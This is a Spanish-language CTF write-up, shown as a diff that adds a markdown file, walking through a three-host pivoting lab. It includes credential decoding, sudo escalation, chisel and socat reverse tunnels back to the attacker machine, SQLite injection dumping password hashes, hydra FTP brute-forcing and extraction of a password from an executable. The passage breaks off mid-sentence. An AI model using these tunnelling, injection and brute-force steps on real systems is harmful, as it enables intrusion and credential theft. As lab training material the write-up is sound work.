@@ -1,0 +1,731 @@
+
+# Enumeracion de Puertos, Servicios y Versiones
+
+arp-scan -I br-7124f0f55645 --localnet
+Interface: br-7124f0f55645, type: EN10MB, MAC: 02:42:d9:5c:d1:1f, IPv4: 10.10.10.1
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.10.10.2	02:42:0a:0a:0a:02	(Unknown: locally administered)
+
+host activo: 10.10.10.2 
+Escaneo ahora con nmap
+
+nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 10.10.10.2 -oN nmap
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 18:21 -03
+Nmap scan report for 10.10.10.2
+Host is up (0.0000050s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 7e:85:1a:70:b5:2e:c6:35:73:9b:64:77:ba:5f:72:8b (ECDSA)
+|_  256 0a:67:56:22:1e:a1:aa:05:44:f0:b9:05:75:6d:9c:36 (ED25519)
+80/tcp open  http    Werkzeug/3.0.4 Python/3.12.3
+|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
+|_http-title: Not A CTF
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.4 Python/3.12.3
+|     Date: Mon, 28 Oct 2024 21:21:37 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 9836
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <!-- Google Fonts Pre Connect -->
+|     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+|     <link rel="preconnect" href="https://fonts.googleapis.com">
+|     <!-- Meta Tags -->
+|     <meta charset="UTF-8">
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <!-- Fonts Links (Roboto 400, 500 and 700 included) -->
+|     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+|     <!-- CSS Files Links -->
+|     <link rel="stylesheet" href="/static/css/styles.css">
+|     <!-- Title -->
+|     <title>Not A CTF</title>
+|     </head>
+|     <body>
+|     <header>
+|     <h1>Bi
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.4 Python/3.12.3
+|     Date: Mon, 28 Oct 2024 21:21:37 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|     Connection: close
+|   RTSPRequest: 
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request version ('RTSP/1.0').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94SVN%I=7%D=10/28%Time=67200061%P=x86_64-pc-linux-gnu%r(
+SF:GetRequest,271B,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.4\
+SF:x20Python/3\.12\.3\r\nDate:\x20Mon,\x2028\x20Oct\x202024\x2021:21:37\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x209836\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
+SF:ng=\"en\">\n<head>\n\x20\x20<!--\x20Google\x20Fonts\x20Pre\x20Connect\x
+SF:20-->\n\x20\x20<link\x20rel=\"preconnect\"\x20href=\"https://fonts\.gst
+SF:atic\.com\"\x20crossorigin>\n\x20\x20<link\x20rel=\"preconnect\"\x20hre
+SF:f=\"https://fonts\.googleapis\.com\">\n\x20\x20<!--\x20Meta\x20Tags\x20
+SF:-->\n\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20<meta\x20http-equiv=\
+SF:"X-UA-Compatible\"\x20content=\"IE=edge\">\n\x20\x20<meta\x20name=\"vie
+SF:wport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\x
+SF:20\x20<!--\x20Fonts\x20Links\x20\(Roboto\x20400,\x20500\x20and\x20700\x
+SF:20included\)\x20-->\n\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"http
+SF:s://fonts\.googleapis\.com/css2\?family=Roboto:wght@400;500;700&display
+SF:=swap\">\n\n\x20\x20<!--\x20CSS\x20Files\x20Links\x20-->\n\x20\x20<link
+SF:\x20rel=\"stylesheet\"\x20href=\"/static/css/styles\.css\">\n\n\x20\x20
+SF:<!--\x20Title\x20-->\n\x20\x20<title>Not\x20A\x20CTF</title>\n</head>\n
+SF:<body>\n\x20\x20\x20\x20<header>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>B
+SF:i")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.
+SF:0\.4\x20Python/3\.12\.3\r\nDate:\x20Mon,\x2028\x20Oct\x202024\x2021:21:
+SF:37\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20
+SF:OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20clos
+SF:e\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\"
+SF:>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20cha
+SF:rset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respon
+SF:se</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x
+SF:20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x
+SF:20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x
+SF:20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x
+SF:20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\
+SF:x20\x20\x20\x20</body>\n</html>\n");
+MAC Address: 02:42:0A:0A:0A:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2 puertos expuestos: ssh/22 & http/80
+
+# Puerto 80 http
+
+al acceder al servicio web me consigo con un mensaje y un boton
+
+-----------------------------------
+¡Atención, Esto no es un CTF!
+	
+	  [cerrar]
+-----------------------------------
+
+al clicar sobre el boton [cerrar]  nos muestra una web con instrucciones de como
+realizar pivoting con Ligolo-ng 
+
+al chequear el codigo fuente, consigo el siguiente comentario al final del codigo:
+
+----------------------------------------------------------------------------------
+<!-- Guardar en KeePass y borrar al verlo.
+Nueva contraseña para el servicio SSH de cerbero el perro de 3 cabezas JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q==== -->
+-----------------------------------------------------------------------------------
+
+me parece que esto esta codeado en base32 y luego en base64 asi que procedo a decodificar
+
+echo 'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q====' |base32 -d |base64 -d
+50 30 73 65 69 64 f3 6e 32 30 32 32 21
+
+ahora tenemos esto que esta codeado en hexadecimal, asi que convertimos a ascii
+
+echo '50 30 73 65 69 64 f3 6e 32 30 32 32 21' |xxd -r -p
+P0seid�n2022!
+
+como mi terminal no esta interpretando el caracter, lo decodifico desde internet, aunque imagino trata solo de una "o" acentuada
+
+>>>> P0seidón2022!
+
+ahora la misma nota que contiene la password tambien indica el user: cerbero el perro de 3 cabezas: user= cerbero
+
+credenciales:
+
+cerbero:P0seidón2022!
+
+# Puerto 22 ssh
+
+ssh cerbero@10.10.10.2
+pass:P0seidón2022!
+
+sudo -l
+
+User cerbero may run the following commands on 5ea3ff3a3a86:
+    (ALL : ALL) ALL
+    (ALL) ALL
+
+como puedo ejecutar todo como root, escalo 
+
+sudo /bin/bash -p
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+hostname -I
+10.10.10.2 20.20.20.2 
+
+aqui existe una interfas de red mas, asi que me comparto un script en bash desde mi maquina atacante
+para realizar un reconocimento de host en la otra red
+
+--------------------------------------------------------------------------
+desde mi maquina atacante:
+
+scp scanip.sh cerbero@10.10.10.2:/home/cerbero
+pass: P0seidón2022!
+
+---------------------------------------------------------------------------
+
+ahora realizo el reconocimiento en la otra red
+
+./scanip.sh 20.20.20.2
+
+[+] La dirección IP es válida. Procediendo con el escaneo...
+
+[+] Host 20.20.20.3 - ACTIVO
+
+existe un host mas activo.. asi que hare un port forwarding con chisel,
+asi que me lo comparto desde mi maquina atacante....
+
+scp chisel cerbero@10.10.10.2:/home/cerbero
+pass:P0seidón2022!
+
+ahora ejecuto chisel en mi maquina atacante y en el host 10.10.10.2
+
+---------------------------------------------------------------------------
+
+en maquina atacante:
+
+chisel server --reverse -p 90
+
+---------------------------------------------------------------------------
+
+en host 10.10.10.2
+
+./chisel client 10.10.10.1:90 R:9000:socks &
+
+----------------------------------------------------------------------------
+
+se a creado el tunel:
+2024/10/28 19:06:40 server: session#1: tun: proxy#R:127.0.0.1:9000=>socks: Listening
+
+----------------------------------------------------------------------------
+
+desde maquina atacante procedo escanear puertos al host 20.20.20.3
+pero primero edito el archivo /etc/proxychains4.conf y agregando el tunel
+creado con chisel
+
+proxychains4 nmap --top-ports 50 -sT -Pn -n --open --min-rate 3000 20.20.20.3 2>/dev/null 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 19:13 -03
+Nmap scan report for 20.20.20.3
+Host is up (0.00068s latency).
+Not shown: 48 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+proceso a acceder al servicio web del host 20.20.20.3
+para esto abrire firefox a traves de proxychains4
+
+proxychains4 firefox
+
+al desplegarse el navegador y acceder al puerto 80, observo lo que es un ranking de maquina,
+al clikcar sobre alguna, me lleva a su enlace de descarga en mega, asi que realizo fuzzing web
+
+feroxbuster -u http://20.20.20.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png -t 200 -d 8 --random-agent --proxy socks5://127.0.0.1:9000 --methods GET,POST
+
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://20.20.20.3
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ Random
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💎  Proxy                 │ socks5://127.0.0.1:9000
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png]
+ 🏁  HTTP methods          │ [GET, POST]
+ 🔃  Recursion Depth       │ 8
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET      157l      357w     3863c http://20.20.20.3/buscador/oraculo.html
+200      GET      138l      248w     5829c http://20.20.20.3/
+200     POST      138l      248w     5829c http://20.20.20.3/
+200      GET        1l        6w       34c http://20.20.20.3/database.php
+200     POST        1l        6w       34c http://20.20.20.3/database.php
+200      GET      138l      248w     5829c http://20.20.20.3/index.html
+200     POST      138l      248w     5829c http://20.20.20.3/index.html
+
+al acceder en http://20.20.20.3/buscador/oraculo.html se observa una barra de busqueda con un historico de
+busquedas anteriores, haciendo pruebas con el buscador, realizando cualquier busqueda, indica: error image
+y probando inyeccion sql indica lo mismo, asi que hare uso de sqlmap
+
+1) captura de peticion con burpsuite:
+
+configuro burpsuite para que pase por el tunel proxy creaado con chisel, una vez configurado
+procedo abrir el navegador desde burpsuite y accedo a http://20.20.20.3/buscador/oraculo.html
+aqui procedo a captura la peticion al realizar una busqueda 
+
+Peticion capturada:
+
+---------------------------------------------------------------------------
+POST /database.php HTTP/1.1
+Host: 20.20.20.3
+Content-Length: 9
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://20.20.20.3
+Referer: http://20.20.20.3/buscador/oraculo.html
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+buscar=ls
+---------------------------------------------------------------------------
+
+la guardo en un archivo >> peticion
+y se lo paso a sqlmap
+
+2) SQLMAP
+
+proxychains4 sqlmap -r consulta --tables --batch --level=3 --risk=3 2>/dev/null
+
+       ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.9#stable}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:40:33 /2024-10-28/
+
+[20:40:33] [INFO] parsing HTTP request from 'consulta'
+[20:40:33] [INFO] resuming back-end DBMS 'sqlite' 
+[20:40:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: buscar (POST)
+    Type: inline query
+    Title: SQLite inline queries
+    Payload: buscar=SELECT CHAR(113,122,106,118,113)||(CASE WHEN (4725=4725) THEN 1 ELSE 0 END)||CHAR(113,118,106,122,113)
+---
+[20:40:33] [INFO] the back-end DBMS is SQLite
+web server operating system: Linux Debian
+web application technology: Apache 2.4.54, PHP 7.4.33
+back-end DBMS: SQLite
+[20:40:33] [INFO] fetching tables for database: 'SQLite_masterdb'
+[20:40:33] [INFO] resumed: 'dioses_semidioses'
+[20:40:33] [INFO] resumed: 'sqlite_sequence'
+[20:40:33] [INFO] resumed: 'powers'
+[20:40:33] [INFO] resumed: 'usuarios'
+[20:40:33] [INFO] resumed: 'contrasena'
+[20:40:33] [INFO] resumed: 'atlantis'
+<current>
+[6 tables]
++-------------------+
+| atlantis          |
+| contrasena        |
+| dioses_semidioses |
+| powers            |
+| sqlite_sequence   |
+| usuarios          |
++-------------------+
+
+a partir de este punto comienzo a tener problemas para dumpear las columnas de las tablas, pero 
+por lo visto es vulnerable y maneja sqlite, asi que pasare al lado manual
+-----------------------------------------------------------------------------------------------------------------------
+
+desde burpsuite, envio la peticion capturada al repeter y luego me voy al decoder para url-encodear la consulta sqlite
+la consulta que hare sera para acceder a la estructura de la base de datos sqlite:
+
+select * from sqlite_master
+
+la url-encodeo y queda:
+
+%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%71%6c%69%74%65%5f%6d%61%73%74%65%72
+
+me voy al repeter y modifico la peticion 
+peticion modificada:
+------------------------------------------------------
+POST /database.php HTTP/1.1
+Host: 20.20.20.3
+Content-Length: 88
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://20.20.20.3
+Referer: http://20.20.20.3/buscador/oraculo.html
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+buscar=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%73%71%6c%69%74%65%5f%6d%61%73%74%65%72
+--------------------------------------------------------
+
+envio la peticion y obtengo la informacion de las tablas:
+_________________________________________________________________________________________________
+HTTP/1.1 200 OK
+Date: Tue, 29 Oct 2024 00:40:22 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 1442
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+table | dioses_semidioses | dioses_semidioses | 2 | CREATE TABLE dioses_semidioses (<br />
+    id INTEGER PRIMARY KEY AUTOINCREMENT,<br />
+    nombre TEXT NOT NULL,<br />
+    tipo TEXT CHECK(tipo IN ('Dios', 'Semidios')) NOT NULL,<br />
+    dominio TEXT,<br />
+    descripcion TEXT<br />
+)<br />
+table | sqlite_sequence | sqlite_sequence | 3 | CREATE TABLE sqlite_sequence(name,seq)<br />
+table | powers | powers | 4 | CREATE TABLE powers (<br />
+    id INTEGER PRIMARY KEY AUTOINCREMENT,<br />
+    nombre TEXT NOT NULL,<br />
+    descripcion TEXT<br />
+)<br />
+table | usuarios | usuarios | 5 | CREATE TABLE usuarios (<br />
+    id INTEGER PRIMARY KEY AUTOINCREMENT,<br />
+    nombre_usuario TEXT NOT NULL UNIQUE,<br />
+    email TEXT UNIQUE<br />
+)<br />
+index | sqlite_autoindex_usuarios_1 | usuarios | 6 | <br />
+index | sqlite_autoindex_usuarios_2 | usuarios | 7 | <br />
+table | contrasena | contrasena | 8 | CREATE TABLE contrasena (<br />
+    id INTEGER PRIMARY KEY AUTOINCREMENT,<br />
+    id_usuario INTEGER NOT NULL,<br />
+    contrasena_hash TEXT NOT NULL UNIQUE,  -- Ã�ndice Ãºnico agregado<br />
+    FOREIGN KEY (id_usuario) REFERENCES usuarios(id)<br />
+)<br />
+index | sqlite_autoindex_contrasena_1 | contrasena | 9 | <br />
+table | atlantis | atlantis | 10 | CREATE TABLE atlantis (<br />
+    id INTEGER PRIMARY KEY AUTOINCREMENT,<br />
+    nombre_usuario TEXT NOT NULL,<br />
+    contrasena_hash TEXT NOT NULL<br />
+)<br />
+__________________________________________________________________________________________________
+
+al detallar las columnas de las tablas, la que mas llama mi atencion es la tabla atlantis
+ya que tiene 2 columnas de interes: nombre_usuario y contrasena_hash
+
+asi que procedo a consultarla
+
+select nombre_usuario,contrasena_hash from atlantis  
+
+esta consulta se url-encodea y la envio por el repeter obteniendo el resultado:
+_____________________________________________________________________________________________________
+HTTP/1.1 200 OK
+Date: Tue, 29 Oct 2024 00:52:15 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 212
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Poseidón | $sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=<br />
+megalodon | $sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=<br />
+______________________________________________________________________________________________________
+
+asi que ya tengo 2 user y sus hash's
+
+echo '$sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=' > hash1
+echo '$sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' > hash2
+
+hashcat --identify hash1
+No hash-mode matches the structure of the input hash.
+
+hashcat --identify hash2
+No hash-mode matches the structure of the input hash.
+
+hashcat no puede identificar los hash, pero tras detallarlos, observo que un segmento de los hash esta 
+como en base64
+
+QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=
+JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=
+
+asi que intento decodificarlos
+
+echo 'QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=' |base64 -d
+B�`�S��Ւ�	��4��94�(T�㤁3�J&v8�JX��4�SS��=�!�tZ��base64: invalid input
+
+sin resultados con el primer intento
+
+echo 'QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=' |base32 -d
+base32: invalid input
+
+nada, asi que paso al aiguiente:
+
+echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' |base64 -d           
+%��	��4��94�(T�㤁3���2�%^D	��<�92� T�ۤ�3��Sm�%UD(�
+
+intento ahora en base32
+
+echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' |base32 -d
+NTQgNjUgNmQgNzAgNmMgMzAgMzIgMzAgMzEgMzkgMjE= 
+
+echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' |base32 -d |base64 -d
+54 65 6d 70 6c 30 32 30 31 39 21
+
+ahora nos arroja una cadena en hexadecimal
+
+echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' |base32 -d |base64 -d |xxd -r -p
+Templ02019!
+
+asi que la password del user megalodon es: Templ02019!
+
+las pruebo contra el servicio ssh del host 20.20.20.3
+
+proxychains4 ssh megalodon@20.20.20.3 2>/dev/null 
+pass:Templ02019!
+
+# Acceso al host 20.20.20.3
+
+user: megalodon
+
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for megalodon: 
+Matching Defaults entries for megalodon on 623f27ad4372:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User megalodon may run the following commands on 623f27ad4372:
+    (ALL : ALL) ALL
+    (ALL) ALL
+
+
+puedo ejecutar cualquier comando como root, asi que escalo
+
+sudo /bin/bash -p
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+hostname -I
+20.20.20.3 30.30.30.2 
+
+existe una interfas mas
+
+enviare el mismo script que envie a la primera maquina para detectar host en la red
+
+------------------------------------------------------------------------------------
+
+desde mi maquina atacante:
+
+proxychains4 scp scanip.sh megalodon@20.20.20.3:/home/megalodon 2>/dev/null
+pass: Templ02019!
+
+------------------------------------------------------------------------------------
+
+procedo a escanear la red con el script 
+
+./scanip.sh 30.30.30.2
+
+[+] La dirección IP es válida. Procediendo con el escaneo...
+
+[+] Host 30.30.30.3 - ACTIVO
+
+
+como he localizado un host en dicha red, lo que hare sera enviar socat al host 10.10.10.2
+y chisel al host 20.20.20.3
+
+------------------------------------------------------------------------------------
+
+desde mi maquina atacante:
+
+proxychains4 scp chisel megalodon@20.20.20.3:/home/megalodon 2>/dev/null
+pass:Templ02019!
+
+proxychains4 scp socat cerbero@10.10.10.2:/home/cerbero 2>/dev/null
+pass:P0seidón2022!
+
+-------------------------------------------------------------------------------------
+
+ahora ejecuto socat en el host 10.10.10.2
+
+./socat tcp-l:1000,fork,reuseaddr tcp:10.10.10.1:90 &
+
+socat escucha por el puerto 1000 y redirecciona al server chisel en mi maquina
+atacante
+
+ahora ejecuto chisel en el host 20.20.20.3
+
+./chisel client 20.20.20.2:1000 R:9001:socks &
+
+chisel envia la conexion al host 20.20.20.2 por el puerto 1000
+que es donde esta socat en espera para reenviar la conexion a
+mi maquina atacante hacia el server chisel para crear un nuevo tunel
+
+2024/10/28 22:42:42 server: session#2: tun: proxy#R:127.0.0.1:9001=>socks: Listening
+
+este nuevo tunel lo agrego al archivo /etc/proxychains4
+y habilito el dynamic_chain
+
+--------------------------------------------------------------------------------------
+
+desde mi maquina atacante procedo a escanear el host 30.30.30.3
+
+proxychains4 nmap --open -sT -Pn -n -vvv --min-rate 5000 30.30.30.3 2>/dev/null
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 22:57 -03
+Initiating Connect Scan at 22:57
+Scanning 30.30.30.3 [1000 ports]
+Discovered open port 445/tcp on 30.30.30.3
+Discovered open port 21/tcp on 30.30.30.3
+Discovered open port 139/tcp on 30.30.30.3
+Discovered open port 80/tcp on 30.30.30.3
+Discovered open port 22/tcp on 30.30.30.3
+Connect Scan Timing: About 31.10% done; ETC: 22:58 (0:01:09 remaining)
+Connect Scan Timing: About 62.30% done; ETC: 22:58 (0:00:37 remaining)
+Completed Connect Scan at 22:58, 97.60s elapsed (1000 total ports)
+Nmap scan report for 30.30.30.3
+Host is up, received user-set (0.10s latency).
+Scanned at 2024-10-28 22:57:08 -03 for 98s
+Not shown: 995 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      REASON
+21/tcp  open  ftp          syn-ack
+22/tcp  open  ssh          syn-ack
+80/tcp  open  http         syn-ack
+139/tcp open  netbios-ssn  syn-ack
+445/tcp open  microsoft-ds syn-ack
+
+para chequear el servicio web primero cierro el navegador firefox y lo vuelvo abrir con
+proxychains4
+
+proxychains4 firerox
+
+una vez desplegado el navegador accedo a la ip 30.30.30.3 y me consigo con la plantilla de apache
+asi que procedo a realizar fuzzing web
+
+feroxbuster -u http://30.30.30.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png -t 100 -d 8 --random-agent --proxy socks5://127.0.0.1:9001 
+                                                                                                                                                                        
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://30.30.30.3
+ 🚀  Threads               │ 100
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ Random
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💎  Proxy                 │ socks5://127.0.0.1:9001
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 8
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       22l      105w     5952c http://30.30.30.3/icons/ubuntu-logo.png
+200      GET      363l      961w    10671c http://30.30.30.3/
+200      GET      363l      961w    10671c http://30.30.30.3/index.html
+
+nada a la vista por aqui... asi que paso al servicio smb y procedo a enumerar con enum4linux-ng
+
+proxychains4 enum4linux-ng -A -R 1 30.30.30.3 2>/dev/null
+
+ ================================================================
+|    Users, Groups and Machines on 30.30.30.3 via RID Cycling    |
+ ================================================================
+[*] Trying to enumerate SIDs
+[+] Found 3 SID(s)
+[*] Trying SID S-1-22-1
+[+] Found user 'Unix User\rayito' (RID 1003)
+[+] Found user 'Unix User\hercules' (RID 1004)
+[*] Trying SID S-1-5-21-3655957501-1296951004-899075090
+[+] Found user 'ZEUS\nobody' (RID 504)
+[+] Found domain group 'ZEUS\None' (RID 516)
+
+aqui consigo 2 user: rayito y hercules los cuales son user del sistema 'Unix'
+aplico fuerza bruta contras el servicio smb pero no obtengo resultados, por lo
+que probare con estos user's por el servicio ftp
+
+proxychains4 hydra -l hercules -P /usr/share/wordlists/rockyou.txt ftp://30.30.30.3 2>/dev/null
+
+[21][ftp] host: 30.30.30.3   login: hercules   password: thunder1
+
+me conecto via ftp
+
+proxychains4 ftp 30.30.30.3 2>/dev/nul
+Connected to 30.30.30.3.
+220 (vsFTPd 3.0.5)
+Name (30.30.30.3:darks): hercules
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||27971|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0           16432 Aug 15 00:55 muerte_a_kratos.exe
+ftp> get muerte_a_kratos.exe
+local: muerte_a_kratos.exe remote: muerte_a_kratos.exe
+229 Entering Extended Passive Mode (|||43143|)
+150 Opening BINARY mode data connection for muerte_a_kratos.exe (16432 bytes).
+
+me consigo con un ejecutable y lo descargo para examinarlo
+
+strings muerte_a_kratos.exe
+.
+.
+AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=
+.
+.
+.
+
+y me consigo con una cadena en base64
+
+echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' |base64 -d
+electrocut4c10n!
+
+parece ser una password pero la probe contra el servicio smb y ssh con el user hercules pero 
